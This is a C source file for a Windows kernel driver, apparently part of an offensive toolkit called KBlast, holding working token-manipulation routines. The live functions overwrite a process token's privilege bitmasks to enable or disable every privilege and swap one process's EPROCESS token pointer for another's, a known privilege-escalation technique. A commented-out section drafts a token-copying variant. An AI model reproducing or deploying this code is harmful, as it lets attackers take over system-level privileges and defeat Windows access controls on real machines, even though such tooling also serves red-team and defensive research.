/*
* Author:	Angelo Frasca Caccia ( lem0nSec_ )
* Title:	KBlaster.sys ( driver )
* Website:	https://github.com/lem0nSec/KBlast
*/


#include "KBlaster_k_token.hpp"


PVOID tokenRestore = 0;

NTSTATUS KBlaster_k_TokenPrivilegeManipulate(int processID, PRIVILEGES_ACTION prOption)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PEPROCESS pEprocess = 0;
	PACCESS_TOKEN pAccessToken = 0;
	PPROCESS_PRIVILEGES pPriv = 0;

	status = PsLookupProcessByProcessId((HANDLE)processID, &pEprocess);
	if (NT_SUCCESS(status))
	{
		pAccessToken = PsReferencePrimaryToken(pEprocess);
		pPriv = (PPROCESS_PRIVILEGES)((ULONG_PTR)pAccessToken + 0x40);
		switch (prOption)
		{
		case PRIVILEGES_ENABLEALL:
			pPriv->Present[0] = pPriv->Enabled[0] = 0xff;
			pPriv->Present[1] = pPriv->Enabled[1] = 0xff;
			pPriv->Present[2] = pPriv->Enabled[2] = 0xff;
			pPriv->Present[3] = pPriv->Enabled[3] = 0xff;
			pPriv->Present[4] = pPriv->Enabled[4] = 0xff;
			break;

		case PRIVILEGES_DISABLEALL:
			pPriv->Present[0] = pPriv->Enabled[0] = 0x00;
			pPriv->Present[1] = pPriv->Enabled[1] = 0x00;
			pPriv->Present[2] = pPriv->Enabled[2] = 0x00;
			pPriv->Present[3] = pPriv->Enabled[3] = 0x00;
			pPriv->Present[4] = pPriv->Enabled[4] = 0x00;
			break;

		default:
			break;
		}

		PsDereferencePrimaryToken(pAccessToken);
		ObDereferenceObject(pEprocess);
	}

	return status;

}



NTSTATUS KBlaster_k_TokenContextSteal(int processID, int targetProcessID)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PEPROCESS pEprocess = 0, pTargetEprocess = 0;
	PEX_FAST_REF pToken = 0, pTargetToken = 0;

	status = PsLookupProcessByProcessId((HANDLE)targetProcessID, &pTargetEprocess);
	if (NT_SUCCESS(status))
	{
		status = PsLookupProcessByProcessId((HANDLE)processID, &pEprocess);
		if (NT_SUCCESS(status))
		{
			pToken = (PEX_FAST_REF)((ULONG_PTR)pEprocess + EPROCESS_TOKEN_OFFSET[KBlaster_k_utils_GetWindowsVersion()]);
			pTargetToken = (PEX_FAST_REF)((ULONG_PTR)pTargetEprocess + EPROCESS_TOKEN_OFFSET[KBlaster_k_utils_GetWindowsVersion()]);
			tokenRestore = pToken->Value;
			pToken->Value = pTargetToken->Value;

			ObDereferenceObject(pEprocess);
		}

		ObDereferenceObject(pTargetEprocess);
	}

	return status;

}


NTSTATUS KBlaster_k_TokenContextRestore(int processID)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PEPROCESS pEprocess = 0;
	PEX_FAST_REF pToken = 0;

	status = PsLookupProcessByProcessId((HANDLE)processID, &pEprocess);
	if (NT_SUCCESS(status))
	{
		pToken = (PEX_FAST_REF)((ULONG_PTR)pEprocess + EPROCESS_TOKEN_OFFSET[KBlaster_k_utils_GetWindowsVersion()]);
		if (tokenRestore != 0)
		{
			pToken->Value = tokenRestore;
			tokenRestore = 0;
		}

		ObDereferenceObject(pEprocess);

	}

	return status;

}




















/* TODO:
* KBlast_TokenCreateVirtualCopy (copy a process' token inside a paged_pool)
* KBlast_TokenDestroyVirtualCopy (zero out the paged_pool and deallocate it)
* KBlast_TokenConnect (connect an EPROCESS to the 'virtual' token inside the paged_pool)
* KBlast_TokenUnlink (unlink the EPROCESS from the virtual token, then restore the original token)
*/


/*
* KBlast_TokenPrivilegeManipulate can either enable or disable a given process token
* privileges.
*/






/*
PVOID KBlast_TokenCreateVirtualCopy(IN PEPROCESS ptProcess, OUT PULONG referenceCount)
{
	PVOID pVirtualToken = 0, pRefPhysicalToken = 0;
	PACCESS_TOKEN pPhysicalToken = 0;
	SIZE_T szToken = 0;


	pRefPhysicalToken = (PVOID)((ULONG_PTR)ptProcess + EPROCESS_TOKEN_OFFSET[KBlast_GetWindowsVersion()]);
	pPhysicalToken = PsReferencePrimaryToken(ptProcess);
	if (pPhysicalToken != 0)
	{
		*referenceCount = (ULONG)((ULONG_PTR)pRefPhysicalToken - (ULONG_PTR)pPhysicalToken - 1);
		szToken = (SIZE_T)(((ULONG_PTR)pVirtualToken + 0x490 + 8) - (ULONG64)pVirtualToken);
		pVirtualToken = ExAllocatePoolWithTag(PagedPool, szToken, POOL_TAG);
		if (pVirtualToken != 0)
		{
			RtlZeroMemory(pVirtualToken, szToken);
			RtlCopyMemory(pVirtualToken, pPhysicalToken, szToken);
		}

		PsDereferencePrimaryToken(pPhysicalToken);

	}

	return pVirtualToken;

}


void KBlast_TokenConnect(PEPROCESS pEprocess, PACCESS_TOKEN pToken, ULONG referenceCount)
{
	PToken pTargetRefToken = 0;

	pTargetRefToken = (PToken)((ULONG_PTR)pEprocess + EPROCESS_TOKEN_OFFSET[KBlast_GetWindowsVersion()]);
	tokenRestore = pTargetRefToken->Value;
	pTargetRefToken->Value = (PVOID)((ULONG64)pToken + referenceCount);

}


void KBlast_TokenDestroyVirtualCopy(PVOID pVirtualToken, SIZE_T szToken)
{
	if (pVirtualToken != 0)
	{
		RtlZeroMemory(pVirtualToken, szToken);
		ExFreePoolWithTag(pVirtualToken, POOL_TAG);
	}
}


void KBlast_TokenUnlink(PEPROCESS pEprocess)
{
	PToken tokenRef = 0;

	tokenRef = (PToken)((ULONG_PTR)pEprocess + EPROCESS_TOKEN_OFFSET[KBlast_GetWindowsVersion()]);
	tokenRef->Value = tokenRestore;
}




NTSTATUS KBlast_TokenContextStealing(int processID, int targetProcessID)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PEPROCESS pEprocess = 0, pTargetEprocess = 0;
	PVOID pVirtualToken = 0;
	ULONG referenceCount = 0;

	status = PsLookupProcessByProcessId((HANDLE)targetProcessID, &pTargetEprocess);
	if (NT_SUCCESS(status))
	{
		status = PsLookupProcessByProcessId((HANDLE)processID, &pEprocess);
		if (NT_SUCCESS(status))
		{
			pVirtualToken = KBlast_TokenCreateVirtualCopy(pTargetEprocess, &referenceCount);
			if (pVirtualToken != 0)
			{
				KBlast_TokenConnect(pEprocess, (PACCESS_TOKEN)pVirtualToken, referenceCount);
			}
			else
			{
				status = STATUS_UNSUCCESSFUL;
			}

			ObDereferenceObject(pEprocess);
		}

		ObDereferenceObject(pTargetEprocess);
	}

	return status;

}
*/